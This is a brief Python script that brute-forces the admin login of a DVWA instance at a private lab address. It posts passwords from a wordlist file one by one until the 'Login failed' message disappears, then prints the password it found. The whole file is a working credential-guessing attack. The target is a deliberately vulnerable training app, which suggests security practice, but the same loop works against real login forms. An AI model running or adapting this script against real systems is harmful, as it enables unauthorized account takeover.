import requests

target_url = "http://192.168.189.131/dvwa/login.php"
data = {"username": "admin", "password": "123", "Login": "submit"}
with open("files-and-dirs-wordlist.txt", "r") as wordlist:
    for line in wordlist:
        word = line.strip()
        data["password"] = word
        response = requests.post(target_url, data=data)
        if "Login failed" not in response.content.decode():
            print("[+] Got the password -->" + word)
            exit()
print("[+] Reached end of line.")
